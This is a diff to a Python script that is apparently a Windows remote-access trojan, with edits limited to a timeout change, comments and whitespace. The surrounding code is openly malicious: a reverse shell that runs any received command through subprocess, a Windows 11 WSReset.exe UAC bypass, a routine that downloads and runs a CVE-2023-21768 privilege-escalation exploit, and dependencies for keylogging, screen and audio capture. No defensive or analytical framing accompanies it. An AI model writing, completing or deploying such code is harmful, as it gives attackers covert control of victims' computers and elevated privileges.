@@ -1,4 +1,4 @@
-#pip install pyautogui(optional) pillow sounddevice scipy pynput pywin32 wmi  psutil request first
+#pip install pyautogui pillow sounddevice scipy pynput pywin32 wmi psutil request first
 
 import socket
 import time
@@ -94,7 +94,7 @@ def upload_file(file_name):
 
 def download_file(file_name):
     with open(file_name, 'wb') as f:
-        s.settimeout(1)
+        s.settimeout(3)
         try:
             while True:
                 chunk = s.recv(1024)
@@ -140,7 +140,7 @@ def is_win11():
         return int(win_ver.split('.')[2]) >= 22000  # Windows 11 build starts from 22000
     except:
         return False
-
+#testing
 def exploit_wsreset_uac_bypass():
     """Windows 11 WSReset.exe UAC bypass with proper elevation handling"""
     try:
@@ -226,7 +226,7 @@ def get_parent_pid_info():
         "parent_name": parent.name()
     }
     reliable_send(f"Reverse shell PID: {info['current_pid']} Parent (likely PowerShell) PID: {info['parent_pid']}, Name: {info['parent_name']}")
-
+# Privilege Escalation Functions
 def cve():
     download_file("Windows_AFD_LPE_CVE-2023-21768_x64.exe")
     try:
@@ -298,9 +298,7 @@ def shell():
             result = exploit_wsreset_uac_bypass()
             reliable_send(str(result))
         elif command == 'uac':
-            cve()
-        
-               
+            cve()     
         else:
             execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
             result = execute.stdout.read() + execute.stderr.read()
